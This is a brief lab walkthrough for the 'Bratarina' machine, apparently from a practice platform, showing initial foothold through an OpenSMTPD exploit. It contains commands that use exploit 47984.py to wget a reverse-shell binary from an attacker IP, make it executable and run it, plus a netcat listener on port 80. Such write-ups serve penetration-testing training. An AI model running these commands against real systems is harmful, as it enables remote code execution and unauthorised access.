# 🏴 Bratarina (Linux)

## 🧠 Initial Foothold

- Found port 25 open running **OpenSMTPD**.

- Searched for vulnerabilities using Searchsploit and identified:
  - **Exploit:** `47984.py`

- Used the following commands to exploit the target:
  ```bash
  python3 47984.py 192.168.102.71 25 "wget 192.168.45.229/revshell.elf -O /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "chmod +x /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "/tmp/revshell.elf"
  ```

- ⚠️ Reverse shell must connect back on **port 80** (other ports may fail).

- Listener:
  ```bash
  nc -nlvp 80
  ```

- Successfully received a shell.

---

📚 **Reference:**  
[Bratarina Writeup by thevillagehacker](https://github.com/thevillagehacker/Proving_Grounds/blob/main/Writeups/2023-10-05-Proving_grounds_Practice-Bratarina.md)

---

🧼 **Post-Exploitation Note:**  
Verify OpenSMTPD version and patch, remove `/tmp` payloads after use.

> ⚠️ This walkthrough is for educational purposes only.
